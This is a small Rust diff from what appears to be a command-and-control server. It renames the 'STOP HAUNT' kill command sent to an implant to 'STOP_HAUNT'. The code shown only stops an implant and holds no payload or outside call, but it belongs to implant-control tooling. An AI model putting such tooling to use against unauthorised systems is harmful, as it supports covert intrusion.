@@ -266,7 +266,7 @@ async fn handle_charon_kill_ghost(
 ) {
     let kill_task = Task {
         id: Uuid::now_v7().to_string(),
-        command: "STOP HAUNT".to_string(),  // magic command for implant to interpret, TODO: think about it
+        command: "STOP_HAUNT".to_string(),  // magic command for implant to interpret, TODO: think about it
         args: "".to_string(),
         status: TaskStatus::Pending,
         result: None
